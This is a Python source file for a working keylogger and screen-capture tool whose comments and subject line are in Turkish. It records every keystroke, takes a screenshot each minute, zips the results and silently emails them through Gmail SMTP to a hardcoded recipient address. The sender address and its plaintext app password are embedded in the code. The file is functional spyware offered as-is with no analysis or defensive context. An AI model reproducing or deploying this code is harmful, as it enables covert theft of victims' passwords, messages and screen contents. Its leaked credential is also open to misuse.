from email import encoders
from email.mime.base import MIMEBase
import threading
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from PIL import ImageGrab
import keyboard
import zipfile


period = 60
duration = period
taken_words = ''
pictures_taken = ImageGrab.grab()
recipient_email = '215541065@firat.edu.tr'
sender_email = 'nktkargo@gmail.com'
sender_email_password = 'luzs jusz gakl sabz'


def timer():
    global duration, taken_words
    while duration > 0:
        duration -= 1
        time.sleep(1)
    else:
        duration = period
        take_screenshot()
        save_text()
        thread_mail = threading.Thread(target=send_mail)
        thread_mail.daemon = True
        thread_mail.start()
        thread_duration = threading.Thread(target=timer)
        thread_duration.daemon = True
        thread_duration.start()
        taken_words = ''


def take_screenshot():
    ImageGrab.grab().save("screenshot.png")


def read_keyboard(event):
    global taken_words
    if event.event_type == keyboard.KEY_DOWN:
        if event.name == "space":
            taken_words += ' '
        elif event.name == "backspace":
            taken_words = taken_words[:-1]
        elif event.name == "enter":
            taken_words += '\n'
        elif event.name == "alt" or event.name == "alt gr" or event.name == "shift" or event.name == "ctrl" or event.name == "left windows":
            pass
        elif event.name == "tab":
            taken_words += "    "
        else:
            taken_words += event.name


def save_text():
    with open("text.txt", "w") as file:
        file.write(taken_words)


def send_mail():
    with zipfile.ZipFile('keylogger.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write("text.txt")
        zipf.write("screenshot.png")

    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    smtp_username = sender_email
    smtp_password = sender_email_password

    subject = f"{period} Saniye Aralıklarla Çeklien Veriler"

    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = recipient_email
    msg["Subject"] = subject

    part = MIMEBase("application", "octet-stream")
    with open("keylogger.zip", "rb") as zip_file:
        part.set_payload(zip_file.read())

    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment; filename= keylogger.zip")
    msg.attach(part)

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(sender_email, recipient_email, msg.as_string())
        server.quit()
    except Exception:
        pass


thread_duration = threading.Thread(target=timer)
thread_duration.daemon = True
thread_duration.start()

keyboard.hook(read_keyboard)
keyboard.wait("")
